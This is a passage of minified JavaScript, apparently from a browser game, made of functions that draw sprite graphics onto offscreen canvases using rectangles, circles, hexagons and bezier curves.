      Be(a, e * -74, e * -57, e * 148, e * 114, e * 23);
      a.restore();
      ye(a, t[1], t[3], e * 8);
      a.save();
      a.translate(e * 101, e * 64.984375);
      Be(a, e * -33, e * -10, e * 66, e * 20, e * 15);
      a.restore();
      ye(a, t[2], t[1], e * 8);
      a.save();
      a.translate(e * 102, e * 63.484375);
      Be(a, e * -9, e * -27.5, e * 18, e * 55, e * 15);
      a.restore();
      ye(a, t[2], t[1], e * 8);
      ze(a, e * 135, e * 107.36605834960938, e * 21.095023109728988);
      ye(a, t[1], t[3], e * 8);
      ze(a, e * 135, e * 107.36605834960938, e * 13);
      ye(a, t[1], t[3], e * 8);
      ze(a, e * 135, e * 107.36605834960938, e * 6.082762530298219);
      ye(a, t[2]);
      ze(a, e * 70, e * 107.36605834960938, e * 21.095023109728988);
      ye(a, t[1], t[3], e * 8);
      ze(a, e * 70, e * 107.36605834960938, e * 13);
      ye(a, t[1], t[3], e * 8);
      ze(a, e * 70, e * 107.36605834960938, e * 6.082762530298219);
      ye(a, t[2]);
      return n;
    }
    function Sr(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 95;
      r.height = e * 85;
      if (t == 0) {
        n.translate(e * 7, e * 15);
        n.scale(0.9, 0.9);
        n.save();
        Be(n, e * 0, e * 5, e * 90, e * 60, 10);
        ye(n, i[0]);
        n.globalCompositeOperation = "destination-out";
        ze(n, e * 25, e * 40, e * 10);
        n.fill();
        ze(n, e * 65, e * 40, e * 10);
        n.fill();
        n.restore();
        n.save();
        Be(n, 0, 0, e * 90, e * 60, e * 10);
        ye(n, i[1]);
        n.globalCompositeOperation = "destination-out";
        ze(n, e * 25, e * 40, e * 10);
        n.fill();
        ze(n, e * 65, e * 40, e * 10);
        n.fill();
        n.restore();
      } else if (t == 1) {
        n.scale(0.8, 0.8);
        n.translate(e * 15, e * 33);
        n.save();
        n.scale(0.56, 0.56);
        n.translate(e * -39, e * -60);
        n.beginPath();
        n.lineCap = "round";
        n.lineJoin = "round";
        n.moveTo(e * 32.5, e * 50.642852783203125);
        n.bezierCurveTo(e * 83, e * 69.64285278320312, e * 83, e * 69.64285278320312, e * 133.5, e * 88.64285278320312);
        n.bezierCurveTo(e * 93, e * 92.64285278320312, e * 93, e * 92.64285278320312, e * 52.5, e * 96.64285278320312);
        n.bezierCurveTo(e * 30.5, e * 100.64285278320312, e * 36.5, e * 94.64285278320312, e * 32.5, e * 84.64285278320312);
        n.bezierCurveTo(e * 21.5, e * 45.642852783203125, e * 24.5, e * 48.642852783203125, e * 31.5, e * 50.642852783203125);
        n.closePath();
        ye(n, i[1]);
        n.beginPath();
        n.lineCap = "round";
        n.lineJoin = "round";
        n.moveTo(e * 116.5, e * 85.64285278320312);
        n.bezierCurveTo(e * 160.5, e * 67.14285278320312, e * 160.5, e * 67.14285278320312, e * 204.5, e * 48.642852783203125);
        n.bezierCurveTo(e * 220.5, e * 42.642852783203125, e * 208.5, e * 68.64285278320312, e * 205.5, e * 85.64285278320312);
        n.bezierCurveTo(e * 202.5, e * 98.64285278320312, e * 199.5, e * 98.64285278320312, e * 188.5, e * 100.64285278320312);
        n.closePath();
        ye(n, i[1]);
        n.beginPath();
        n.lineCap = "round";
        n.lineJoin = "round";
        n.moveTo(e * 166.5, e * 68.64285278320312);
        n.bezierCurveTo(e * 147.5, e * 72.64285278320312, e * 145.5, e * 73.64285278320312, e * 142.5, e * 62.642852783203125);
        n.bezierCurveTo(e * 121.5, e * 12.642852783203125, e * 122.5, e * 5.642852783203125, e * 117.5, e * 15.642852783203125);
        n.bezierCurveTo(e * 105.5, e * 40.642852783203125, e * 105.5, e * 40.642852783203125, e * 93.5, e * 65.64285278320312);
        n.bezierCurveTo(e * 89.5, e * 74.64285278320312, e * 84.5, e * 72.64285278320312, e * 73.5, e * 74.64285278320312);
        n.bezierCurveTo(e * 98, e * 87.64285278320312, e * 98, e * 87.64285278320312, e * 122.5, e * 100.64285278320312);
        n.closePath();
        ye(n, i[1]);
        n.restore();
        n.save();
        Be(n, 0, e * 15, e * 90, e * 50, e * 10);
        ye(n, i[0]);
        Be(n, 0, e * 10, e * 90, e * 50, e * 10);
        ye(n, i[1]);
        n.globalCompositeOperation = "destination-out";
        ze(n, e * 25, e * 40, e * 10);
        n.fill();
        ze(n, e * 65, e * 40, e * 10);
        n.fill();
        n.restore();
      }
      return r;
    }
    function pr(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 120;
      r.height = e * 100;
      Be(n, e * 10, e * 10, e * 95, e * 80, e * 10);
      ye(n, i[2]);
      Be(n, e * 10, e * 5, e * 95, e * 80, e * 10);
      ye(n, i[3], i[4], e * 4);
      if (t == 0) {
        var a = Sr(e * 0.75, i, 0);
        n.drawImage(a, e * 22, e * 18);
      } else if (t == 1) {
        a = Sr(e * 0.75, i, 1);
        n.drawImage(a, e * 22, e * 18);
      }
      return r;
    }
    function mr(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 185;
      r.height = e * 164;
      n.translate(0, 0);
      var a = function (e, i, t) {
        var r = document.createElement("canvas");
        var n = r.getContext("2d");
        r.width = e * 201;
        r.height = e * 164;
        n.translate(0, e * 5);
        n.globalAlpha = i ? 0.5 : 1;
        ze(n, e * 100.5, e * 82, e * 74.92746655359852);
        ye(n, t[0], t[0], e * 4);
        ze(n, e * 100.5, e * 82, e * 65.9417374971317);
        ye(n, t[0], t[0], e * 4);
        n.translate(0, -5);
        n.globalAlpha = 1;
        ze(n, e * 100.5, e * 82, e * 74.92746655359852);
        ye(n, t[1], t[3], e * 4);
        ze(n, e * 100.5, e * 82, e * 65.9417374971317);
        ye(n, t[1], t[2], e * 4);
        ze(n, e * 100.5, e * 82, e * 35.9417374971317);
        ye(n, t[1], t[2], e * 20);
        ze(n, e * 100.5, e * 82, e * 15.9417374971317);
        ye(n, t[1], t[2], e * 6);
        return r;
      }(e, i, t);
      n.drawImage(a, e * -10, e * 0);
      a = Dr(e, i, t, 0);
      n.drawImage(a, e * -83, e * -40);
      a = Dr(e, i, t, Math.PI / 1.4);
      n.drawImage(a, e * -15, e * -88);
      a = Dr(e, i, t, Math.PI / -1.4);
      n.drawImage(a, e * 15, e * -8);
      return r;
    }
    function vr(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 450;
      r.height = e * 790;
      n.translate(e * 5, e * 5);
      n.globalAlpha = 0;
      ze(n, e * 178.5, e * 172.828125, e * 150);
      ye(n, undefined, t[0], e * 65);
      ze(n, e * 178.5, e * 172.828125, e * 150);
      ye(n, undefined, t[0], e * 55);
      n.closePath();
      n.save();
      n.translate(e * 177, e * 512.328125);
      Be(n, e * -25, e * -202.5, e * 65, e * 405, e * 25);
      n.restore();
      ye(n, t[0]);
      n.save();
      n.translate(e * 136, e * 581.828125);
      Be(n, e * -39, e * -23, e * 78, e * 46, e * 25);
      n.restore();
      ye(n, t[0]);
      n.save();
      n.translate(e * 135.5, e * 663.828125);
      Be(n, e * -39.5, e * -22, e * 79, e * 44, e * 25);
      n.restore();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 114, e * 594.828125);
      n.bezierCurveTo(e * 175, e * 596.828125, e * 163, e * 596.828125, e * 172, e * 594.828125);
      n.bezierCurveTo(e * 171.5, e * 633.828125, e * 171.5, e * 633.828125, e * 171, e * 672.828125);
      n.bezierCurveTo(e * 110, e * 673.828125, e * 140.5, e * 673.328125, e * 110, e * 673.828125);
      n.bezierCurveTo(e * 110.5, e * 661.828125, e * 110.5, e * 661.828125, e * 111, e * 649.828125);
      n.bezierCurveTo(e * 157, e * 633.828125, e * 134, e * 607.828125, e * 114, e * 594.828125);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.translate(0, e * 5);
      n.moveTo(e * 140, e * 294.828125);
      n.bezierCurveTo(e * 212, e * 295.828125, e * 176.5, e * 295.328125, e * 213, e * 295.828125);
      n.bezierCurveTo(e * 201.5, e * 325.328125, e * 201.5, e * 325.328125, e * 190, e * 354.828125);
      n.bezierCurveTo(e * 175.5, e * 355.828125, e * 175.5, e * 355.828125, e * 161, e * 356.828125);
      n.bezierCurveTo(e * 154.5, e * 328.828125, e * 154.5, e * 328.828125, e * 148, e * 300.828125);
      n.closePath();
      ye(n, t[0]);
      n.translate(3, e * -5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 159, e * 679.828125);
      n.bezierCurveTo(e * 180, e * 665.828125, e * 155, e * 675.828125, e * 151, e * 671.828125);
      n.bezierCurveTo(e * 154.5, e * 685.328125, e * 154.5, e * 685.328125, e * 158, e * 698.828125);
      n.bezierCurveTo(e * 171, e * 699.828125, e * 171, e * 699.828125, e * 184, e * 700.828125);
      n.closePath();
      ye(n, t[0]);
      n.save();
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 157, e * 548.828125);
      n.bezierCurveTo(e * 157, e * 561.828125, e * 157, e * 561.828125, e * 157, e * 574.828125);
      n.bezierCurveTo(e * 132.5, e * 580.828125, e * 132.5, e * 580.828125, e * 108, e * 586.828125);
      n.bezierCurveTo(e * 112, e * 599.828125, e * 111, e * 593.828125, e * 112, e * 599.828125);
      n.bezierCurveTo(e * 159, e * 603.828125, e * 126.5, e * 601.328125, e * 141, e * 602.828125);
      n.bezierCurveTo(e * 145, e * 641.828125, e * 143.5, e * 623.828125, e * 146, e * 644.828125);
      n.bezierCurveTo(e * 129.5, e * 645.328125, e * 129.5, e * 645.328125, e * 113, e * 645.828125);
      n.bezierCurveTo(e * 107.5, e * 652.828125, e * 107.5, e * 652.828125, e * 102, e * 659.828125);
      n.bezierCurveTo(e * 104, e * 669.328125, e * 104, e * 669.328125, e * 106, e * 678.828125);
      n.bezierCurveTo(e * 145, e * 679.328125, e * 145, e * 679.328125, e * 184, e * 679.828125);
      n.bezierCurveTo(e * 185, e * 615.828125, e * 185, e * 615.828125, e * 186, e * 551.828125);
      n.bezierCurveTo(e * 172.5, e * 551.328125, e * 172.5, e * 551.328125, e * 159, e * 550.828125);
      n.closePath();
      ye(n, t[0], t[0], e * 7);
      n.restore();
      n.globalAlpha = 1;
      n.translate(e * 15, e * 35);
      ze(n, e * 178.5, e * 172.828125, e * 150);
      ye(n, undefined, t[2], e * 95);
      ze(n, e * 178.5, e * 172.828125, e * 150);
      ye(n, undefined, t[1], e * 55);
      n.closePath();
      n.save();
      n.translate(e * 177, e * 512.328125);
      Be(n, e * -25, e * -202.5, e * 65, e * 405, e * 25);
      n.restore();
      ye(n, t[1], t[2], e * 20);
      n.save();
      n.translate(e * 136, e * 581.828125);
      Be(n, e * -39, e * -23, e * 78, e * 46, e * 25);
      n.restore();
      ye(n, t[1], t[2], e * 20);
      n.save();
      n.translate(e * 135.5, e * 663.828125);
      Be(n, e * -39.5, e * -22, e * 79, e * 44, e * 25);
      n.restore();
      ye(n, t[1], t[2], e * 20);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 114, e * 594.828125);
      n.bezierCurveTo(e * 175, e * 596.828125, e * 163, e * 596.828125, e * 172, e * 594.828125);
      n.bezierCurveTo(e * 171.5, e * 633.828125, e * 171.5, e * 633.828125, e * 171, e * 672.828125);
      n.bezierCurveTo(e * 110, e * 673.828125, e * 140.5, e * 673.328125, e * 110, e * 673.828125);
      n.bezierCurveTo(e * 110.5, e * 661.828125, e * 110.5, e * 661.828125, e * 111, e * 649.828125);
      n.bezierCurveTo(e * 157, e * 633.828125, e * 134, e * 607.828125, e * 114, e * 594.828125);
      n.closePath();
      ye(n, t[1]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.translate(0, e * 5);
      n.moveTo(e * 123, e * 294.828125);
      n.bezierCurveTo(e * 212, e * 295.828125, e * 190.5, e * 295.328125, e * 250, e * 295.828125);
      n.bezierCurveTo(e * 231.5, e * 325.328125, e * 231.5, e * 325.328125, e * 220, e * 354.828125);
      n.bezierCurveTo(e * 175.5, e * 355.828125, e * 175.5, e * 355.828125, e * 140, e * 356.828125);
      n.bezierCurveTo(e * 123.5, e * 328.828125, e * 123.5, e * 328.828125, e * 123, e * 294.828125);
      n.closePath();
      ye(n, t[1]);
      n.translate(0, e * -5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 159, e * 679.828125);
      n.bezierCurveTo(e * 180, e * 665.828125, e * 155, e * 675.828125, e * 151, e * 671.828125);
      n.bezierCurveTo(e * 154.5, e * 685.328125, e * 154.5, e * 685.328125, e * 158, e * 698.828125);
      n.bezierCurveTo(e * 171, e * 699.828125, e * 171, e * 699.828125, e * 184, e * 700.828125);
      n.closePath();
      ye(n, t[1]);
      n.save();
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 157, e * 548.828125);
      n.bezierCurveTo(e * 157, e * 561.828125, e * 157, e * 561.828125, e * 157, e * 574.828125);
      n.bezierCurveTo(e * 132.5, e * 580.828125, e * 132.5, e * 580.828125, e * 108, e * 586.828125);
      n.bezierCurveTo(e * 112, e * 599.828125, e * 111, e * 593.828125, e * 112, e * 599.828125);
      n.bezierCurveTo(e * 159, e * 603.828125, e * 126.5, e * 601.328125, e * 141, e * 602.828125);
      n.bezierCurveTo(e * 145, e * 641.828125, e * 143.5, e * 623.828125, e * 146, e * 644.828125);
      n.bezierCurveTo(e * 129.5, e * 645.328125, e * 129.5, e * 645.328125, e * 113, e * 645.828125);
      n.bezierCurveTo(e * 107.5, e * 652.828125, e * 107.5, e * 652.828125, e * 102, e * 659.828125);
      n.bezierCurveTo(e * 104, e * 669.328125, e * 104, e * 669.328125, e * 106, e * 678.828125);
      n.bezierCurveTo(e * 145, e * 679.328125, e * 145, e * 679.328125, e * 184, e * 679.828125);
      n.bezierCurveTo(e * 185, e * 615.828125, e * 185, e * 615.828125, e * 186, e * 551.828125);
      n.bezierCurveTo(e * 172.5, e * 551.328125, e * 172.5, e * 551.328125, e * 159, e * 550.828125);
      n.closePath();
      ye(n, t[1], t[1], e * 7);
      n.restore();
      return r;
    }
    function Mr(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 202;
      r.height = e * 202;
      n.translate(e * 2, e * 1);
      n.globalAlpha = 0.3;
      ze(n, e * 98, e * 99, e * 100);
      ye(n, t[0]);
      n.globalAlpha = 0.5;
      ze(n, e * 98, e * 99, e * 90);
      ye(n, t[1]);
      return r;
    }
    function Lr(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 89;
      r.height = e * 89;
      n.save();
      n.translate(e * 44.5, e * 44.5);
      Ve(n, 6, e * 40, e * 10);
      n.restore();
      ye(n, t[0], t[1], e * 5);
      n.save();
      n.translate(e * 44.5, e * 44.5);
      Ve(n, 6, e * 25.11521001172521, e * 10);
      n.restore();
      ye(n, t[2], t[3], e * 5);
      return r;
    }
    function Gr(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 88;
      r.height = e * 88;
      n.save();
      n.translate(e * 44, e * 44);
      n.rotate(0.52);
      Ve(n, 6, e * 43, e * 10);
      n.restore();
      ye(n, t[0], t[1], e * 3);
      return r;
    }
    function fr(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 202;
      r.height = e * 202;
      n.translate(e * 2, e * 1);
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(0, e * 10);
      n.save();
      n.translate(e * 98, e * 41.15177917480469);
      n.rotate(0.8);
      Be(n, e * -16, e * -16.5, e * 32, e * 33, e * 7);
      n.restore();
      ye(n, t[2]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 98, e * 22.5089111328125);
      n.bezierCurveTo(e * 97.5, e * 41.5089111328125, e * 97.5, e * 41.5089111328125, e * 97, e * 60.5089111328125);
      ye(n, t[2]);
      n.save();
      n.translate(e * 147.5, e * 69.5089111328125);
      n.rotate(0.2);
      Be(n, e * -15.5, e * -16, e * 31, e * 32, e * 7);
      n.restore();
      ye(n, t[2]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 163, e * 59.50892639160156);
      n.bezierCurveTo(e * 147, e * 69.50892639160156, e * 127, e * 82.50892639160156, e * 131, e * 79.50892639160156);
      ye(n, t[2]);
      n.save();
      n.translate(e * 143.5, e * 128.2946319580078);
      n.rotate(1.24);
      Be(n, e * -16.5, e * -17.5, e * 33, e * 35, e * 7);
      n.restore();
      ye(n, t[2]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 162, e * 135.93748474121094);
      n.bezierCurveTo(e * 143.5, e * 128.43748474121094, e * 129, e * 120.93748474121094, e * 125, e * 120.93748474121094);
      ye(n, t[2]);
      n.save();
      n.translate(e * 99, e * 156.08035278320312);
      n.rotate(0.84);
      Be(n, e * -18, e * -18, e * 36, e * 36, e * 7);
      n.restore();
      ye(n, t[2]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 98, e * 136.08035278320312);
      n.bezierCurveTo(e * 98, e * 156.08035278320312, e * 98, e * 156.08035278320312, e * 98, e * 176.08035278320312);
      ye(n, t[2]);
      n.save();
      n.translate(e * 54, e * 72.22320556640625);
      n.rotate(1.32);
      Be(n, e * -18, e * -19, e * 36, e * 38, e * 7);
      n.restore();
      ye(n, t[2]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 34, e * 60.79463195800781);
      n.bezierCurveTo(e * 53.5, e * 72.29463195800781, e * 69, e * 79.79463195800781, e * 73, e * 83.79463195800781);
      ye(n, t[2]);
      n.save();
      n.translate(e * 49, e * 127.29463195800781);
      n.rotate(1.76);
      Be(n, e * -20, e * -17.5, e * 40, e * 35, e * 7);
      n.restore();
      ye(n, t[2]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 30, e * 141.7946319580078);
      n.bezierCurveTo(e * 47, e * 130.2946319580078, e * 64, e * 119.79463195800781, e * 64, e * 118.79463195800781);
      ye(n, t[2]);
      n.globalAlpha = 1;
      n.translate(0, e * -10);
      n.save();
      n.translate(e * 98, e * 41.15177917480469);
      n.rotate(0.8);
      Be(n, e * -16, e * -16.5, e * 32, e * 33, e * 7);
      n.restore();
      ye(n, t[3], t[4], e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 98, e * 22.5089111328125);
      n.bezierCurveTo(e * 97.5, e * 41.5089111328125, e * 97.5, e * 41.5089111328125, e * 97, e * 60.5089111328125);
      ye(n, undefined, t[4], e * 5);
      n.save();
      n.translate(e * 147.5, e * 69.5089111328125);
      n.rotate(0.2);
      Be(n, e * -15.5, e * -16, e * 31, e * 32, e * 7);
      n.restore();
      ye(n, t[3], t[4], e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 163, e * 59.50892639160156);
      n.bezierCurveTo(e * 147, e * 69.50892639160156, e * 127, e * 82.50892639160156, e * 131, e * 79.50892639160156);
      ye(n, undefined, t[4], e * 5);
      n.save();
      n.translate(e * 143.5, e * 128.2946319580078);
      n.rotate(1.24);
      Be(n, e * -16.5, e * -17.5, e * 33, e * 35, e * 7);
      n.restore();
      ye(n, t[3], t[4], e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 162, e * 135.93748474121094);
      n.bezierCurveTo(e * 143.5, e * 128.43748474121094, e * 129, e * 120.93748474121094, e * 125, e * 120.93748474121094);
      ye(n, undefined, t[4], e * 5);
      n.save();
      n.translate(e * 99, e * 156.08035278320312);
      n.rotate(0.84);
      Be(n, e * -18, e * -18, e * 36, e * 36, e * 7);
      n.restore();
      ye(n, t[3], t[4], e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 98, e * 136.08035278320312);
      n.bezierCurveTo(e * 98, e * 156.08035278320312, e * 98, e * 156.08035278320312, e * 98, e * 176.08035278320312);
      ye(n, undefined, t[4], e * 5);
      n.save();
      n.translate(e * 54, e * 72.22320556640625);
      n.rotate(1.32);
      Be(n, e * -18, e * -19, e * 36, e * 38, e * 7);
      n.restore();
      ye(n, t[3], t[4], e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 34, e * 60.79463195800781);
      n.bezierCurveTo(e * 53.5, e * 72.29463195800781, e * 69, e * 79.79463195800781, e * 73, e * 83.79463195800781);
      ye(n, undefined, t[4], e * 5);
      n.save();
      n.translate(e * 49, e * 127.29463195800781);
      n.rotate(1.76);
      Be(n, e * -20, e * -17.5, e * 40, e * 35, e * 7);
      n.restore();
      ye(n, t[3], t[4], e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 30, e * 141.7946319580078);
      n.bezierCurveTo(e * 47, e * 130.2946319580078, e * 64, e * 119.79463195800781, e * 64, e * 118.79463195800781);
      ye(n, undefined, t[4], e * 5);
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(0, e * 10);
      n.save();
      n.translate(e * 98, e * 99);
      Ve(n, 6, e * 70.28669492273468, e * 10);
      n.restore();
      ye(n, t[2]);
      n.save();
      n.translate(e * 98, e * 99);
      Ve(n, 6, e * 56.455940020351264, e * 10);
      n.restore();
      ye(n, t[2]);
      n.globalAlpha = 1;
      n.translate(0, e * -10);
      n.save();
      n.translate(e * 98, e * 99);
      Ve(n, 6, e * 70.28669492273468, e * 10);
      n.restore();
      ye(n, t[5], t[6], e * 5);
      n.save();
      n.translate(e * 98, e * 99);
      Ve(n, 6, e * 56.455940020351264, e * 10);
      n.restore();
      ye(n, t[7], t[8], e * 7);
      return r;
    }
    function Hr(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 161;
      r.height = e * 184;
      n.translate(0, e * 10);
      n.globalAlpha = 1;
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 105.5, e * 34.609375);
      n.bezierCurveTo(e * 48.5, e * 7.609375, e * 11.5, e * 58.609375, e * 20.5, e * 97.609375);
      n.bezierCurveTo(e * 44.5, e * 161.609375, e * 70.5, e * 171.609375, e * 88.5, e * 156.609375);
      n.bezierCurveTo(e * 120.5, e * 129.609375, e * 123.5, e * 105.609375, e * 128.5, e * 83.609375);
      n.bezierCurveTo(e * 137.5, e * 79.609375, e * 141.5, e * 79.609375, e * 146.5, e * 81.609375);
      n.bezierCurveTo(e * 153.5, e * 70.609375, e * 151.5, e * 65.609375, e * 148.5, e * 61.609375);
      n.bezierCurveTo(e * 134.5, e * 60.609375, e * 131.5, e * 63.609375, e * 127.5, e * 66.609375);
      n.bezierCurveTo(e * 127.5, e * 55.609375, e * 125.5, e * 54.609375, e * 120.5, e * 51.609375);
      n.bezierCurveTo(e * 128.5, e * 42.609375, e * 136.5, e * 38.609375, e * 147.5, e * 39.609375);
      n.bezierCurveTo(e * 152.5, e * 23.609375, e * 147.5, e * 21.609375, e * 140.5, e * 17.609375);
      n.bezierCurveTo(e * 120.5, e * 17.609375, e * 114.5, e * 27.609375, e * 106.5, e * 35.609375);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 45.5, e * 144.609375);
      n.bezierCurveTo(e * 35.5, e * 155.609375, e * 37, e * 152.109375, e * 28.5, e * 159.609375);
      n.bezierCurveTo(e * 16.5, e * 154.609375, e * 16.5, e * 151.609375, e * 17.5, e * 141.609375);
      n.bezierCurveTo(e * 25.5, e * 134.109375, e * 25.5, e * 134.109375, e * 33.5, e * 126.609375);
      ye(n, t[0]);
      n.translate(0, e * -10);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 45.5, e * 144.609375);
      n.bezierCurveTo(e * 35.5, e * 155.609375, e * 37, e * 152.109375, e * 28.5, e * 159.609375);
      n.bezierCurveTo(e * 16.5, e * 154.609375, e * 16.5, e * 151.609375, e * 17.5, e * 141.609375);
      n.bezierCurveTo(e * 25.5, e * 134.109375, e * 25.5, e * 134.109375, e * 33.5, e * 126.609375);
      ye(n, t[1], t[2], e * 8);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 105.5, e * 34.609375);
      n.bezierCurveTo(e * 48.5, e * 7.609375, e * 11.5, e * 58.609375, e * 20.5, e * 97.609375);
      n.bezierCurveTo(e * 44.5, e * 161.609375, e * 70.5, e * 171.609375, e * 88.5, e * 156.609375);
      n.bezierCurveTo(e * 120.5, e * 129.609375, e * 123.5, e * 105.609375, e * 128.5, e * 83.609375);
      n.bezierCurveTo(e * 137.5, e * 79.609375, e * 141.5, e * 79.609375, e * 146.5, e * 81.609375);
      n.bezierCurveTo(e * 153.5, e * 70.609375, e * 151.5, e * 65.609375, e * 148.5, e * 61.609375);
      n.bezierCurveTo(e * 134.5, e * 60.609375, e * 131.5, e * 63.609375, e * 127.5, e * 66.609375);
      n.bezierCurveTo(e * 127.5, e * 55.609375, e * 125.5, e * 54.609375, e * 120.5, e * 51.609375);
      n.bezierCurveTo(e * 128.5, e * 42.609375, e * 136.5, e * 38.609375, e * 147.5, e * 39.609375);
      n.bezierCurveTo(e * 152.5, e * 23.609375, e * 147.5, e * 21.609375, e * 140.5, e * 17.609375);
      n.bezierCurveTo(e * 120.5, e * 17.609375, e * 114.5, e * 27.609375, e * 106.5, e * 35.609375);
      n.closePath();
      ye(n, t[1], t[2], e * 8);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 104.5, e * 35.609375);
      n.bezierCurveTo(e * 71.5, e * 36.609375, e * 57.5, e * 52.609375, e * 58.5, e * 81.609375);
      n.bezierCurveTo(e * 59.5, e * 103.609375, e * 66.5, e * 107.609375, e * 66.5, e * 116.609375);
      n.bezierCurveTo(e * 67.5, e * 128.609375, e * 65.5, e * 131.609375, e * 63.5, e * 137.609375);
      ye(n, undefined, t[2], e * 8);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 59.5, e * 72.609375);
      n.bezierCurveTo(e * 38.5, e * 80.609375, e * 43.5, e * 81.609375, e * 37.5, e * 89.609375);
      ye(n, undefined, t[2], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 60.5, e * 85.609375);
      n.bezierCurveTo(e * 75.5, e * 91.609375, e * 76.5, e * 96.609375, e * 81.5, e * 104.609375);
      ye(n, undefined, t[2], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 68.5, e * 122.609375);
      n.bezierCurveTo(e * 79.5, e * 130.609375, e * 74.5, e * 128.609375, e * 80.5, e * 134.609375);
      ye(n, t[1], t[2], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 142.5, e * 18.609375);
      n.bezierCurveTo(e * 151.5, e * 28.609375, e * 151.5, e * 32.609375, e * 146.5, e * 40.609375);
      n.bezierCurveTo(e * 137.5, e * 26.609375, e * 138.5, e * 24.609375, e * 142.5, e * 19.609375);
      n.closePath();
      ye(n, t[3]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 146.5, e * 61.50892639160156);
      n.bezierCurveTo(e * 157.5, e * 69.50892639160156, e * 150.5, e * 79.50892639160156, e * 145.5, e * 81.50892639160156);
      n.bezierCurveTo(e * 140.5, e * 65.50892639160156, e * 144.5, e * 64.50892639160156, e * 146.5, e * 62.50892639160156);
      n.closePath();
      ye(n, t[3]);
      return r;
    }
    function Pr(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 104;
      r.height = e * 117;
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 4, e * 90);
      n.bezierCurveTo(e * 20, e * 99.5, e * 20, e * 99.5, e * 36, e * 109);
      n.bezierCurveTo(e * 67, e * 92, e * 67, e * 92, e * 98, e * 75);
      n.bezierCurveTo(e * 91, e * 27, e * 91, e * 27, e * 91, e * 28);
      n.bezierCurveTo(e * 72.5, e * 16, e * 72.5, e * 16, e * 54, e * 4);
      n.bezierCurveTo(e * 33.5, e * 10, e * 33.5, e * 10, e * 13, e * 16);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 6, e * 76);
      n.bezierCurveTo(e * 13.5, e * 51.5, e * 13.5, e * 51.5, e * 21, e * 27);
      n.bezierCurveTo(e * 37.5, e * 17, e * 37.5, e * 17, e * 54, e * 7);
      n.bezierCurveTo(e * 33.5, e * 12.5, e * 33.5, e * 12.5, e * 13, e * 18);
      n.closePath();
      ye(n, t[1]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 24, e * 62);
      n.bezierCurveTo(e * 28.5, e * 53, e * 28.5, e * 53, e * 33, e * 44);
      n.bezierCurveTo(e * 41.5, e * 41, e * 41.5, e * 41, e * 50, e * 38);
      n.bezierCurveTo(e * 52.5, e * 35, e * 52.5, e * 35, e * 55, e * 32);
      n.bezierCurveTo(e * 52, e * 30, e * 52, e * 30, e * 49, e * 28);
      n.bezierCurveTo(e * 38, e * 31.5, e * 38, e * 31.5, e * 27, e * 35);
      n.closePath();
